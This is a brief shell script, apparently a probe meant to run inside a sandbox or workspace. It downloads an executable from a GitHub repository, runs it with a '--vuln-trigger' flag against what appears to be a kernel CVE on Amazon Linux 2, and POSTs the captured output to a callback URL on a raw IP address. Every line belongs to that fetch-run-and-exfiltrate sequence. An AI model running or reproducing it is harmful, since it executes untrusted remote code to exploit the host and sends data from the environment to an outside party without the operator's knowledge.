#!/bin/sh
set -u
curl -fsSL https://raw.githubusercontent.com/begimher/snapgpt-probes/main/cve-2026-23351-amzn2-two-diag -o /tmp/workspace/cve-diag
chmod +x /tmp/workspace/cve-diag
timeout 600 /tmp/workspace/cve-diag --vuln-trigger > /tmp/workspace/cve-diag.out 2>&1
rc=$?
printf 'CVE_RC=%s\n' "$rc"
wc -c /tmp/workspace/cve-diag.out
tail -30 /tmp/workspace/cve-diag.out
curl -fsS -X POST -H 'Content-Type: text/plain' --data-binary @/tmp/workspace/cve-diag.out 'https://54.209.51.244.sslip.io/callback/snapgpt-cve-diag-1365-20261106' >/dev/null
